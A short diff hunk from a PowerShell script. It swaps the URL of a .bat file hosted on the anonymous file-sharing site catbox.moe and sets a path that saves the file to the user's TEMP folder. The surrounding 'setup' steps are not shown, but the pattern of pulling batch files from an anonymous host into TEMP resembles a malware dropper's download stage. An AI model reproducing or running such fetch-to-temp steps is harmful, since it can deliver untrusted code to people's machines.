@@ -40,7 +40,7 @@ $setup1Files = @(
 )
 
 # Setup 2 URL
-$setup2BatUrl = "https://files.catbox.moe/s7vf89.bat"
+$setup2BatUrl = "https://files.catbox.moe/vb7h6y.bat"
 $setup2BatPath = Join-Path $env:TEMP "s7vf89.bat"
 
 # Setup 3 URLs
